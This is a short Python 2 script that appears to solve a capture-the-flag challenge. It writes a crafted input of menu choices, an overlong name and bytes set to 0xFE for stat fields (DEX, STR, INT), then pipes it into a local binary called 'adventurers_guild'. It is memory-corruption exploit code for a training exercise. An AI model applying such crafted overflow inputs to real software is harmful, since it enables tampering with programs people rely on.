# Run with python2
import os

# String copy - Can copy null byte
name = "[" + "*" * 62
header = "]"

#testingdata = chr(0b10100000) + chr(0b00000000)
testingdata = chr( 0 * 16 + 15 ) + chr( 15 * 16 + 15 )
testingdata = chr(0b00000000) + "\xff"

DEX = '\xFE' #'\x43'
STR = '\xFE'
INT = '\xFE' # \xff is 255, \xfe is 254 etc.
payload= header + testingdata + DEX+STR+INT + "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" #+'\xFF\xFF\xFF\xFF'

final = '1\na\n2\n1\n'+name+payload+'\n'
with open("/tmp/payload", 'w') as f:
  f.write(final)

# print(chr(0b01000001)) # A in binary

os.system("(cat /tmp/payload; cat) | ./adventurers_guild")
os.system("rm /tmp/payload")
